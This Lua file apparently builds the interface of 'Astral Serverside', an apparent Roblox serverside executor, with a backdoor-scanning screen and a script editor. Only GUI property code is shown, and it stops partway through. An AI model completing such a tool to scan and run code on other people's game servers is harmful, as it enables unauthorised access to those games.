local AST = {};

-- StarterGui.Astral Serverside
AST["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
AST["1"]["IgnoreGuiInset"] = true;
AST["1"]["DisplayOrder"] = 1999999999;
AST["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
AST["1"]["Name"] = [[Astral Serverside]];
AST["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
AST["1"]["ResetOnSpawn"] = false;


-- StarterGui.Astral Serverside.MainFrame
AST["2"] = Instance.new("Frame", AST["1"]);
AST["2"]["BorderSizePixel"] = 0;
AST["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
AST["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
AST["2"]["ClipsDescendants"] = true;
AST["2"]["Size"] = UDim2.new(0, 450, 0, 275);
AST["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
AST["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["2"]["Name"] = [[MainFrame]];
AST["2"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.Corner
AST["3"] = Instance.new("UICorner", AST["2"]);
AST["3"]["Name"] = [[Corner]];
AST["3"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.Border
AST["4"] = Instance.new("UIStroke", AST["2"]);
AST["4"]["Name"] = [[Border]];
AST["4"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Astral Serverside.MainFrame.Border.Rainbow
AST["5"] = Instance.new("UIGradient", AST["4"]);
AST["5"]["Name"] = [[Rainbow]];
AST["5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};


-- StarterGui.Astral Serverside.MainFrame.Border.Rainbow.Rotation
AST["6"] = Instance.new("LocalScript", AST["5"]);
AST["6"]["Name"] = [[Rotation]];


-- StarterGui.Astral Serverside.MainFrame.Drag
AST["7"] = Instance.new("LocalScript", AST["2"]);
AST["7"]["Name"] = [[Drag]];


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame
AST["8"] = Instance.new("Frame", AST["2"]);
AST["8"]["Visible"] = false;
AST["8"]["BorderSizePixel"] = 0;
AST["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["8"]["ClipsDescendants"] = true;
AST["8"]["Size"] = UDim2.new(1, 0, 1, 0);
AST["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["8"]["Name"] = [[ScanningFrame]];
AST["8"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Corner
AST["9"] = Instance.new("UICorner", AST["8"]);
AST["9"]["Name"] = [[Corner]];
AST["9"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Description
AST["a"] = Instance.new("TextLabel", AST["8"]);
AST["a"]["TextWrapped"] = true;
AST["a"]["TextStrokeTransparency"] = 0;
AST["a"]["BorderSizePixel"] = 0;
AST["a"]["TextSize"] = 14;
AST["a"]["TextScaled"] = true;
AST["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
AST["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
AST["a"]["BackgroundTransparency"] = 1;
AST["a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
AST["a"]["Size"] = UDim2.new(1, -50, 0, 125);
AST["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["a"]["Text"] = [[The game might freeze, don't worry it's scanning though.]];
AST["a"]["Name"] = [[Description]];
AST["a"]["Position"] = UDim2.new(0.5, 0, 0.5, 48);


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Title
AST["b"] = Instance.new("TextLabel", AST["8"]);
AST["b"]["TextWrapped"] = true;
AST["b"]["TextStrokeTransparency"] = 0;
AST["b"]["BorderSizePixel"] = 0;
AST["b"]["TextSize"] = 14;
AST["b"]["TextScaled"] = true;
AST["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
AST["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
AST["b"]["BackgroundTransparency"] = 1;
AST["b"]["Size"] = UDim2.new(1, 0, 0, 64);
AST["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["b"]["Text"] = [[Astral Serverside]];
AST["b"]["Name"] = [[Title]];
AST["b"]["Position"] = UDim2.new(0, 0, 0, 10);


-- StarterGui.Astral Serverside.MainFrame.ScanningHandler
AST["c"] = Instance.new("LocalScript", AST["2"]);
AST["c"]["Name"] = [[ScanningHandler]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame
AST["d"] = Instance.new("Frame", AST["2"]);
AST["d"]["BorderSizePixel"] = 0;
AST["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["d"]["ClipsDescendants"] = true;
AST["d"]["Size"] = UDim2.new(1, 0, 1, 0);
AST["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["d"]["Name"] = [[ExecutionFrame]];
AST["d"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Corner
AST["e"] = Instance.new("UICorner", AST["d"]);
AST["e"]["Name"] = [[Corner]];
AST["e"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox
AST["f"] = Instance.new("Frame", AST["d"]);
AST["f"]["BorderSizePixel"] = 0;
AST["f"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
AST["f"]["AnchorPoint"] = Vector2.new(0.5, 0);
AST["f"]["ClipsDescendants"] = true;
AST["f"]["Size"] = UDim2.new(1, -50, 0, 175);
AST["f"]["Position"] = UDim2.new(0.5, 0, 0, 50);
AST["f"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
AST["f"]["Name"] = [[FastColoredTextbox]];
AST["f"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll
AST["10"] = Instance.new("ScrollingFrame", AST["f"]);
AST["10"]["Active"] = true;
AST["10"]["ZIndex"] = 2;
AST["10"]["BorderSizePixel"] = 0;
AST["10"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
AST["10"]["TopImage"] = [[]];
AST["10"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
AST["10"]["Name"] = [[Scroll]];
AST["10"]["BottomImage"] = [[]];
AST["10"]["Size"] = UDim2.new(1, 0, 1, 0);
AST["10"]["ScrollBarImageColor3"] = Color3.fromRGB(43, 43, 43);
AST["10"]["BorderColor3"] = Color3.fromRGB(127, 129, 126);
AST["10"]["ScrollBarThickness"] = 17;
AST["10"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.TextBox
AST["11"] = Instance.new("TextBox", AST["10"]);
AST["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
AST["11"]["BorderSizePixel"] = 0;
AST["11"]["TextWrapped"] = true;
AST["11"]["TextTransparency"] = 0.75;
AST["11"]["TextSize"] = 15;
AST["11"]["TextColor3"] = Color3.fromRGB(42, 42, 42);
AST["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
AST["11"]["BackgroundColor3"] = Color3.fromRGB(29, 35, 46);
AST["11"]["RichText"] = true;
AST["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
AST["11"]["MultiLine"] = true;
AST["11"]["ClearTextOnFocus"] = false;
AST["11"]["Size"] = UDim2.new(10, -27, 1, 0);
AST["11"]["Position"] = UDim2.new(0, 17, 0, 0);
AST["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["11"]["Text"] = [[]];
AST["11"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.Highlighting
AST["12"] = Instance.new("TextLabel", AST["10"]);
AST["12"]["TextWrapped"] = true;
AST["12"]["BorderSizePixel"] = 0;
AST["12"]["TextSize"] = 15;
AST["12"]["TextXAlignment"] = Enum.TextXAlignment.Left;
AST["12"]["TextYAlignment"] = Enum.TextYAlignment.Top;
AST["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
AST["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
AST["12"]["BackgroundTransparency"] = 1;
AST["12"]["RichText"] = true;
AST["12"]["Size"] = UDim2.new(10, -27, 1, 0);
AST["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["12"]["Text"] = [[]];
AST["12"]["Name"] = [[Highlighting]];
AST["12"]["Position"] = UDim2.new(0, 20, 0, 0);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LineSelector
AST["13"] = Instance.new("Frame", AST["10"]);
AST["13"]["ZIndex"] = -7;
AST["13"]["BorderSizePixel"] = 0;
AST["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["13"]["Size"] = UDim2.new(1, 0, 0, 15);
AST["13"]["Position"] = UDim2.new(0, 20, 0, 0);
AST["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["13"]["Name"] = [[LineSelector]];
AST["13"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.Cursor
AST["14"] = Instance.new("Frame", AST["10"]);
AST["14"]["BorderSizePixel"] = 0;
AST["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["14"]["Size"] = UDim2.new(0, 1, 0, 15);
AST["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["14"]["Name"] = [[Cursor]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.TextMeasurer
AST["15"] = Instance.new("TextLabel", AST["10"]);
AST["15"]["BorderSizePixel"] = 0;
AST["15"]["TextSize"] = 15;
AST["15"]["TextXAlignment"] = Enum.TextXAlignment.Left;
AST["15"]["TextYAlignment"] = Enum.TextYAlignment.Top;
AST["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
AST["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
AST["15"]["BackgroundTransparency"] = 1;
AST["15"]["RichText"] = true;
AST["15"]["Size"] = UDim2.new(10, -27, 1, 0);
AST["15"]["Visible"] = false;
AST["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["15"]["Text"] = [[]];
AST["15"]["Name"] = [[TextMeasurer]];
AST["15"]["Position"] = UDim2.new(0, 20, 0, 0);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesValue
AST["16"] = Instance.new("NumberValue", AST["10"]);
AST["16"]["Name"] = [[LinesValue]];
AST["16"]["Value"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame
AST["17"] = Instance.new("Frame", AST["10"]);
AST["17"]["BorderSizePixel"] = 0;
AST["17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
AST["17"]["Size"] = UDim2.new(0, 17, 17.91826, 0);
AST["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["17"]["Name"] = [[LinesFrame]];
AST["17"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame.TextLabelTemplate
AST["18"] = Instance.new("TextLabel", AST["17"]);
AST["18"]["TextWrapped"] = true;
AST["18"]["BorderSizePixel"] = 0;
AST["18"]["TextSize"] = 15;
AST["18"]["TextScaled"] = true;
AST["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
AST["18"]["TextColor3"] = Color3.fromRGB(205, 205, 205);
AST["18"]["BackgroundTransparency"] = 1;
AST["18"]["Size"] = UDim2.new(0, 17, 0, 15);
AST["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["18"]["Text"] = [[1]];
AST["18"]["Name"] = [[TextLabelTemplate]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame.UIListLayout
AST["19"] = Instance.new("UIListLayout", AST["17"]);
AST["19"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Handler
AST["1a"] = Instance.new("LocalScript", AST["f"]);
AST["1a"]["Name"] = [[Handler]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top
AST["1b"] = Instance.new("Frame", AST["f"]);
AST["1b"]["Visible"] = false;
AST["1b"]["ZIndex"] = 3;
AST["1b"]["BorderSizePixel"] = 0;
AST["1b"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
AST["1b"]["Size"] = UDim2.new(0, 17, 0, 17);
AST["1b"]["Position"] = UDim2.new(1, -17, 0, 0);
AST["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["1b"]["Name"] = [[Y_Top]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow
AST["1c"] = Instance.new("Frame", AST["1b"]);
AST["1c"]["Size"] = UDim2.new(0, 16, 0, 16);
AST["1c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
AST["1c"]["Name"] = [[Arrow]];
AST["1c"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
AST["1d"] = Instance.new("Frame", AST["1c"]);
AST["1d"]["BorderSizePixel"] = 0;
AST["1d"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["1d"]["Size"] = UDim2.new(0, 7, 0, 1);
AST["1d"]["Position"] = UDim2.new(0, 5, 0, 9);
AST["1d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
AST["1d"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
AST["1e"] = Instance.new("Frame", AST["1c"]);
AST["1e"]["BorderSizePixel"] = 0;
AST["1e"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["1e"]["Size"] = UDim2.new(0, 5, 0, 1);
AST["1e"]["Position"] = UDim2.new(0, 6, 0, 8);
AST["1e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
AST["1e"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
AST["1f"] = Instance.new("Frame", AST["1c"]);
AST["1f"]["BorderSizePixel"] = 0;
AST["1f"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["1f"]["Size"] = UDim2.new(0, 3, 0, 1);
AST["1f"]["Position"] = UDim2.new(0, 7, 0, 7);
AST["1f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
AST["1f"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
AST["20"] = Instance.new("Frame", AST["1c"]);
AST["20"]["BorderSizePixel"] = 0;
AST["20"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["20"]["Size"] = UDim2.new(0, 1, 0, 1);
AST["20"]["Position"] = UDim2.new(0, 8, 0, 6);
AST["20"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
AST["20"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Button
AST["21"] = Instance.new("TextButton", AST["1b"]);
AST["21"]["BorderSizePixel"] = 0;
AST["21"]["TextSize"] = 14;
AST["21"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
AST["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
AST["21"]["BackgroundTransparency"] = 1;
AST["21"]["Size"] = UDim2.new(1, 0, 1, 0);
AST["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["21"]["Text"] = [[]];
AST["21"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm
AST["22"] = Instance.new("Frame", AST["f"]);
AST["22"]["Visible"] = false;
AST["22"]["ZIndex"] = 3;
AST["22"]["BorderSizePixel"] = 0;
AST["22"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
AST["22"]["Size"] = UDim2.new(0, 17, 0, 17);
AST["22"]["Position"] = UDim2.new(1, -17, 1, -17);
AST["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["22"]["Name"] = [[Y_Btm]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Button
AST["23"] = Instance.new("TextButton", AST["22"]);
AST["23"]["BorderSizePixel"] = 0;
AST["23"]["TextSize"] = 14;
AST["23"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
AST["23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
AST["23"]["BackgroundTransparency"] = 1;
AST["23"]["Size"] = UDim2.new(1, 0, 1, 0);
AST["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["23"]["Text"] = [[]];
AST["23"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow
AST["24"] = Instance.new("Frame", AST["22"]);
AST["24"]["Size"] = UDim2.new(0, 16, 0, 16);
AST["24"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
AST["24"]["Name"] = [[Arrow]];
AST["24"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
AST["25"] = Instance.new("Frame", AST["24"]);
AST["25"]["BorderSizePixel"] = 0;
AST["25"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["25"]["Size"] = UDim2.new(0, 7, 0, 1);
AST["25"]["Position"] = UDim2.new(0, 5, 0, 7);
AST["25"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
AST["25"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
AST["26"] = Instance.new("Frame", AST["24"]);
AST["26"]["BorderSizePixel"] = 0;
AST["26"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["26"]["Size"] = UDim2.new(0, 5, 0, 1);
AST["26"]["Position"] = UDim2.new(0, 6, 0, 8);
AST["26"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
AST["26"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
AST["27"] = Instance.new("Frame", AST["24"]);
AST["27"]["BorderSizePixel"] = 0;
AST["27"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["27"]["Size"] = UDim2.new(0, 3, 0, 1);
AST["27"]["Position"] = UDim2.new(0, 7, 0, 9);
AST["27"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
AST["27"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
AST["28"] = Instance.new("Frame", AST["24"]);
AST["28"]["BorderSizePixel"] = 0;
AST["28"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["28"]["Size"] = UDim2.new(0, 1, 0, 1);
AST["28"]["Position"] = UDim2.new(0, 8, 0, 10);
AST["28"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
AST["28"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft
AST["29"] = Instance.new("Frame", AST["f"]);
AST["29"]["Visible"] = false;
AST["29"]["ZIndex"] = 3;
AST["29"]["BorderSizePixel"] = 0;
AST["29"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
AST["29"]["Size"] = UDim2.new(0, 17, 0, 17);
AST["29"]["Position"] = UDim2.new(0, 0, 1, -17);
AST["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["29"]["Name"] = [[X_Lft]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Button
AST["2a"] = Instance.new("TextButton", AST["29"]);
AST["2a"]["BorderSizePixel"] = 0;
AST["2a"]["TextSize"] = 14;
AST["2a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
AST["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
AST["2a"]["BackgroundTransparency"] = 1;
AST["2a"]["Size"] = UDim2.new(1, 0, 1, 0);
AST["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["2a"]["Text"] = [[]];
AST["2a"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow
AST["2b"] = Instance.new("Frame", AST["29"]);
AST["2b"]["Size"] = UDim2.new(0, 16, 0, 16);
AST["2b"]["Name"] = [[Arrow]];
AST["2b"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
AST["2c"] = Instance.new("Frame", AST["2b"]);
AST["2c"]["BorderSizePixel"] = 0;
AST["2c"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["2c"]["Size"] = UDim2.new(0, 1, 0, 1);
AST["2c"]["Position"] = UDim2.new(0, 6, 0, 8);
AST["2c"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
AST["2d"] = Instance.new("Frame", AST["2b"]);
AST["2d"]["BorderSizePixel"] = 0;
AST["2d"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["2d"]["Size"] = UDim2.new(0, 1, 0, 3);
AST["2d"]["Position"] = UDim2.new(0, 7, 0, 7);
AST["2d"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
AST["2e"] = Instance.new("Frame", AST["2b"]);
AST["2e"]["BorderSizePixel"] = 0;
AST["2e"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["2e"]["Size"] = UDim2.new(0, 1, 0, 5);
AST["2e"]["Position"] = UDim2.new(0, 8, 0, 6);
AST["2e"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
AST["2f"] = Instance.new("Frame", AST["2b"]);
AST["2f"]["BorderSizePixel"] = 0;
AST["2f"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["2f"]["Size"] = UDim2.new(0, 1, 0, 7);
AST["2f"]["Position"] = UDim2.new(0, 9, 0, 5);
AST["2f"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght
AST["30"] = Instance.new("Frame", AST["f"]);
AST["30"]["Visible"] = false;
AST["30"]["ZIndex"] = 3;
AST["30"]["BorderSizePixel"] = 0;
AST["30"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
AST["30"]["Size"] = UDim2.new(0, 17, 0, 17);
AST["30"]["Position"] = UDim2.new(1, -18, 1, -17);
AST["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["30"]["Name"] = [[X_Rght]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Button
AST["31"] = Instance.new("TextButton", AST["30"]);
AST["31"]["BorderSizePixel"] = 0;
AST["31"]["TextSize"] = 14;
AST["31"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
AST["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
AST["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
AST["31"]["BackgroundTransparency"] = 1;
AST["31"]["Size"] = UDim2.new(1, 0, 1, 0);
AST["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["31"]["Text"] = [[]];
AST["31"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow
AST["32"] = Instance.new("Frame", AST["30"]);
AST["32"]["Size"] = UDim2.new(0, 16, 0, 16);
AST["32"]["Name"] = [[Arrow]];
AST["32"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
AST["33"] = Instance.new("Frame", AST["32"]);
AST["33"]["BorderSizePixel"] = 0;
AST["33"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["33"]["Size"] = UDim2.new(0, 1, 0, 1);
AST["33"]["Position"] = UDim2.new(0, 10, 0, 8);
AST["33"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
AST["34"] = Instance.new("Frame", AST["32"]);
AST["34"]["BorderSizePixel"] = 0;
AST["34"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["34"]["Size"] = UDim2.new(0, 1, 0, 3);
AST["34"]["Position"] = UDim2.new(0, 9, 0, 7);
AST["34"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
AST["35"] = Instance.new("Frame", AST["32"]);
AST["35"]["BorderSizePixel"] = 0;
AST["35"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["35"]["Size"] = UDim2.new(0, 1, 0, 5);
AST["35"]["Position"] = UDim2.new(0, 8, 0, 6);
AST["35"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
AST["36"] = Instance.new("Frame", AST["32"]);
AST["36"]["BorderSizePixel"] = 0;
AST["36"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
AST["36"]["Size"] = UDim2.new(0, 1, 0, 7);
AST["36"]["Position"] = UDim2.new(0, 7, 0, 5);
AST["36"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Ground
AST["37"] = Instance.new("Frame", AST["f"]);
AST["37"]["Visible"] = false;
AST["37"]["ZIndex"] = 2;
AST["37"]["BorderSizePixel"] = 0;
AST["37"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
AST["37"]["Size"] = UDim2.new(0, 17, 0, 17);
AST["37"]["Position"] = UDim2.new(1, -17, 1, -17);
AST["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["37"]["Name"] = [[Ground]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Bar
AST["38"] = Instance.new("Frame", AST["f"]);
AST["38"]["Visible"] = false;
AST["38"]["ZIndex"] = 2;
AST["38"]["BorderSizePixel"] = 0;
AST["38"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
AST["38"]["Size"] = UDim2.new(0, 17, 1, -17);
AST["38"]["Position"] = UDim2.new(1, -17, 0, 0);
AST["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
AST["38"]["Name"] = [[Y_Bar]];
AST["38"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Bar
AST["39"] = Instance.new("Frame", AST["f"]);
